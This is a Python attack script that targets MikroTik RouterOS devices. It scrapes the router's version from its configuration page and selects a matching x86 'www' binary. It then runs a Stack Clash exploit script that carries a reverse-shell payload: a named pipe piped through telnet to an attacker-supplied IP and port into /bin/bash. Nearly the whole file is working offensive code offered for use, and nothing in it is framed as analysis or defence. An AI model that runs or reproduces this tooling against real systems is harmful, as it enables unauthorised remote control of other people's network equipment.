import requests
import os
import sys
from bs4 import BeautifulSoup
url = sys.argv[1]
port_attack = sys.argv[2]
rev_ip = sys.argv[3]
rev_port = sys.argv[4]





www_binaries = ["www_6372_x86_binary","www_6373_x86_binary","www_6381_x86_binary","www_6382_x86_binary","www_6383_x86_binary","www_6384_x86_binary"
                ,"www_6385_x86_binary","www_638_x86_binary","www_6427_x86_binary","www_6371_x86_binary","www_637_x86_binary","www_6363_x86_binary",
                "www_6362_x86_binary","www_6361_x86_binary","www_636_x86_binary","www_6354_x86_binary","www_6352_x86_binary","www_6351_x86_binary"
                ,"www_635_x86_binary","www_6344_x86_binary","www_6343_x86_binary","www_6342_x86_binary","www_6341_x86_binary","www_634_x86_binary",
                "www_6336_x86_binary","www_6335_x86_binary","www_6333_x86_binary","www_6332_x86_binary","www_6331_x86_binary","www_633_x86_binary",
                "www_6322_x86_binary","www_6321_x86_binary","www_630_x86_binary"]




def exploit_target_x86(ip_in,www_binary,rev_ip,port):
    command_mikrotik_pwn = """python2 StackClash_x86.py """+ip_in+""" """+port_attack+""" """+www_binary+""" \
"/bin/mknod /ram/f p; /bin/telnet """+rev_ip+ """ """+port+""" < /ram/f | /bin/bash > /ram/f 2>&1\""""
    print("Executing Rev Telnet")
    print(command_mikrotik_pwn)
    try:
       o=os.popen(command_mikrotik_pwn).read()
       print o
    except:
        pass

    
def get_version(url):
    req = requests.get(url)
    soup = BeautifulSoup(req.text, "lxml")
    title = soup.title
    try:

        if title:
           if "RouterOS router configuration page" in title:
              routeros_version = soup.h1.string
              line = routeros_version.replace("RouterOS v","")
              line2 = line.replace(".","")
              return line2
              #I do this to make it easier to compare the binary for www bin
          
    except:
        pass
    
       
version = get_version(url)
print(version)
for versions in www_binaries:
    if version in versions:
       print("We Have a Hit utilizing www Binary:"+versions)
       try:
          if versions:
             exploit_target_x86(url,versions,rev_ip,rev_port)
       except:
            pass

